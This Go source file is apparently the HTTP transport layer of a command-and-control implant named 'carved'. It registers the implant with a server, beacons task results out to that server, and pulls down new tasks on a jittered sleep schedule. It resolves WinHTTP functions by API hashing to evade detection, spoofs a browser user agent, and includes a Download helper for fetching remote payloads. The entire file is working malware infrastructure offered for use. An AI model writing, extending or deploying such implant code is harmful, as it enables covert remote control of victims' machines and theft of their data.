package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"time"
	"unsafe"

	wc "github.com/carved4/go-wincall"
	"github.com/carved4/carved/shared/proto"
)

type HTTPTransport struct {
	config		*Config
	implantID	string
}

func NewHTTPTransport(cfg *Config, implantID string) *HTTPTransport {
	return &HTTPTransport{
		config:		cfg,
		implantID:	implantID,
	}
}

func (t *HTTPTransport) Register(meta *proto.ImplantMeta) error {
	data, err := json.Marshal(meta)
	if err != nil {
		return err
	}
	_, err = t.post("/register", data)
	return err
}

func (t *HTTPTransport) Beacon(results []*proto.TaskResult) ([]*proto.Task, error) {
	beacon := &proto.Beacon{
		ImplantID:	t.implantID,
		Results:	results,
	}

	data, err := json.Marshal(beacon)
	if err != nil {
		return nil, err
	}

	respData, err := t.post("/beacon", data)
	if err != nil {
		return nil, err
	}

	var resp proto.BeaconResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return nil, err
	}

	return resp.Tasks, nil
}

func (t *HTTPTransport) Sleep() time.Duration {
	base := time.Duration(t.config.Sleep) * time.Second
	if t.config.Jitter == 0 {
		return base
	}
	jitterMax := float64(base) * (float64(t.config.Jitter) / 100.0)
	jitter := time.Duration(rand.Float64() * jitterMax)
	return base + jitter
}

func (t *HTTPTransport) UpdateSleep(sleep uint32, jitter uint8) {
	t.config.Sleep = sleep
	t.config.Jitter = jitter
}

func (t *HTTPTransport) post(endpoint string, body []byte) ([]byte, error) {

	baseURL := t.config.ServerURL
	if len(baseURL) > 0 && baseURL[len(baseURL)-1] == '/' {
		baseURL = baseURL[:len(baseURL)-1]
	}
	url := baseURL + endpoint
	return httpRequest(url, "POST", body, t.config.UserAgent)
}

func httpRequest(url, method string, body []byte, userAgent string) ([]byte, error) {
	if len(url) < 8 {
		return nil, fmt.Errorf("invalid URL")
	}

	var host, path string
	var port uint16 = 443
	var secure bool = true

	if len(url) >= 8 && url[:8] == "https://" {
		remaining := url[8:]
		parseHostPathPort(remaining, &host, &path, &port)
	} else if len(url) >= 7 && url[:7] == "http://" {
		remaining := url[7:]
		port = 80
		parseHostPathPort(remaining, &host, &path, &port)
		secure = false
	} else {
		return nil, fmt.Errorf("invalid URL scheme")
	}

	wc.LoadLibraryLdr("winhttp.dll")
	dllHash := wc.GetHash("winhttp.dll")
	moduleBase := wc.GetModuleBase(dllHash)

	winHttpOpen := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpOpen"))
	winHttpConnect := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpConnect"))
	winHttpOpenRequest := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpOpenRequest"))
	winHttpSendRequest := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpSendRequest"))
	winHttpReceiveResponse := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpReceiveResponse"))
	winHttpReadData := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpReadData"))
	winHttpCloseHandle := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpCloseHandle"))
	winHttpAddRequestHeaders := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpAddRequestHeaders"))

	if userAgent == "" {
		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}

	userAgentPtr, _ := wc.UTF16ptr(userAgent)
	hostPtr, _ := wc.UTF16ptr(host)
	pathPtr, _ := wc.UTF16ptr(path)
	methodPtr, _ := wc.UTF16ptr(method)

	hSession, _, _ := wc.CallG0(winHttpOpen, uintptr(unsafe.Pointer(userAgentPtr)), 0, 0, 0, 0)
	if hSession == 0 {
		return nil, fmt.Errorf("WinHttpOpen failed")
	}
	defer wc.CallG0(winHttpCloseHandle, hSession)

	hConnect, _, _ := wc.CallG0(winHttpConnect, hSession, uintptr(unsafe.Pointer(hostPtr)), uintptr(port), 0)
	if hConnect == 0 {
		return nil, fmt.Errorf("WinHttpConnect failed")
	}
	defer wc.CallG0(winHttpCloseHandle, hConnect)

	var flags uintptr = 0
	if secure {
		flags = 0x00800000
	}

	hRequest, _, _ := wc.CallG0(winHttpOpenRequest, hConnect, uintptr(unsafe.Pointer(methodPtr)), uintptr(unsafe.Pointer(pathPtr)), 0, 0, 0, flags)
	if hRequest == 0 {
		return nil, fmt.Errorf("WinHttpOpenRequest failed")
	}
	defer wc.CallG0(winHttpCloseHandle, hRequest)

	if method == "POST" && len(body) > 0 {
		contentType, _ := wc.UTF16ptr("Content-Type: application/json\r\n")
		wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(contentType)), ^uintptr(0), 0x20000000)
	}

	var bodyPtr uintptr
	var bodyLen uintptr
	if len(body) > 0 {
		bodyPtr = uintptr(unsafe.Pointer(&body[0]))
		bodyLen = uintptr(len(body))
	}

	result, _, _ := wc.CallG0(winHttpSendRequest, hRequest, 0, 0, bodyPtr, bodyLen, bodyLen, 0)
	if result == 0 {
		return nil, fmt.Errorf("WinHttpSendRequest failed")
	}

	result, _, _ = wc.CallG0(winHttpReceiveResponse, hRequest, 0)
	if result == 0 {
		return nil, fmt.Errorf("WinHttpReceiveResponse failed")
	}

	var buffer bytes.Buffer
	chunk := make([]byte, 4096)
	for {
		var bytesRead uint32
		result, _, _ := wc.CallG0(winHttpReadData, hRequest, uintptr(unsafe.Pointer(&chunk[0])), uintptr(len(chunk)), uintptr(unsafe.Pointer(&bytesRead)))
		if result == 0 {
			return nil, fmt.Errorf("WinHttpReadData failed")
		}
		if bytesRead == 0 {
			break
		}
		buffer.Write(chunk[:bytesRead])
	}

	return buffer.Bytes(), nil
}

func parseHostPathPort(remaining string, host, path *string, port *uint16) {

	slashPos := -1
	colonPos := -1
	for i, c := range remaining {
		if c == ':' && colonPos == -1 {
			colonPos = i
		}
		if c == '/' {
			slashPos = i
			break
		}
	}

	hostEnd := len(remaining)
	if slashPos != -1 {
		hostEnd = slashPos
		*path = remaining[slashPos:]
	} else {
		*path = "/"
	}

	hostPart := remaining[:hostEnd]

	if colonPos != -1 && colonPos < hostEnd {
		*host = hostPart[:colonPos]
		portStr := hostPart[colonPos+1:]
		var p int
		for _, c := range portStr {
			if c >= '0' && c <= '9' {
				p = p*10 + int(c-'0')
			}
		}
		if p > 0 && p < 65536 {
			*port = uint16(p)
		}
	} else {
		*host = hostPart
	}
}

func Get(url string) ([]byte, error) {
	return httpRequest(url, "GET", nil, "")
}

func Download(url string) ([]byte, error) {
	return Get(url)
}

func (t *HTTPTransport) Close() error {
	return nil
}

